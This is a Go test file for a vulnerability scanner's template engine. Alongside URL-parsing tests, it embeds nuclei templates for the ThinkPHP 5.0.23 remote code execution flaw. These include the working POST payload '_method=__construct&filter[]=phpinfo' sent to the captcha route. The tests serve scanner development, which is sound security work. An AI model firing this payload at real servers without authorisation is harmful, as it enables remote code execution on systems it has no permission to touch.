package httptpl

import (
	"bytes"
	"github.com/davecgh/go-spew/spew"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"strings"
	"testing"
)

func TestStringToUrl(t *testing.T) {
	check := false
	for _, u := range utils.ParseStringToUrls("baidu.com") {
		if strings.Contains(u, "https://baidu.com") {
			check = true
		}
	}
	if !check {
		panic(1)
	}
	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("baidu.com") {
		if strings.Contains(u, "https://www.baidu.com") {
			check = true
		}
	}
	if !check {
		panic(1)
	}

	check = false
	for _, u := range utils.ParseStringToUrls("www.baidu.com/abc") {
		if strings.Contains(u, "https://www.baidu.com/abc") {
			check = true
		}
	}
	if !check {
		panic(2)
	}

	check = false
	for _, u := range utils.ParseStringToUrls("baidu.com/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://baidu.com/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}

	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("baidu.com/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://www.baidu.com/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}

	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("1.1.1.1:3321/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://1.1.1.1:3321/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}

	check = false
	for _, u := range utils.ParseStringToUrlsWith3W("1.1.1.1/abc") {
		spew.Dump(u)
		if strings.Contains(u, "https://1.1.1.1/abc") {
			check = true
		}
	}
	if !check {
		panic(3)
	}
}

func TestScan2(t *testing.T) {
	consts.GetGormProfileDatabase()
	consts.GetGormProjectDatabase()

	ScanPacket([]byte(`GET / HTTP/1.1
Host: 127.0.0.1:8004

abc`), lowhttp.WithHttps(false), WithMode("nuclei"),
		WithFuzzQueryTemplate("thinkphp"),
		// WithConcurrentTemplates(1), WithConcurrentInTemplates(1),
		WithEnableReverseConnectionFeature(false),
	)
}

func TestThinkphpPacket(t *testing.T) {
	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(`id: thinkphp-5023-rce

info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=captcha"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# Enhanced by md on 2022/10/05`)
	if err != nil {
		panic(err)
	}

	checked := false
	for req := range tpl.generateRequests() {
		if bytes.Contains(req.Requests[0].Raw, []byte("\r\n\r\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1")) {
			spew.Dump(req.Requests[0].Raw)
			checked = true
		}
	}
	if !checked {
		panic(1)
	}
}

func TestThinkphpPacket_Vars(t *testing.T) {
	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(`id: thinkphp-5023-rce

info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce

variables:
  a1: "{{rand_int(1000,9000)}}"
  a2: "{{rand_int(1000,9000)}}"
  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}" 

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=captcha--------a5{{a4}}"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1--------a5{{a4}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# Enhanced by md on 2022/10/05`)
	if err != nil {
		panic(err)
	}

	checked := false
	for req := range tpl.generateRequests() {
		var reqIns = req.Requests[0]
		println(string(reqIns.Raw))
		if bytes.Contains(req.Requests[0].Raw, []byte("\r\n\r\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1")) && bytes.Contains(reqIns.Raw, []byte("{{params(a4)")) {
			checked = true
		}
	}

	if tpl.Variables == nil {
		panic("empty variables")
	}
	spew.Dump(tpl.Variables.ToMap())
	if len(tpl.Variables.ToMap()) != 3 {
		panic(1)
	}

	if !checked {
		panic(1)
	}
}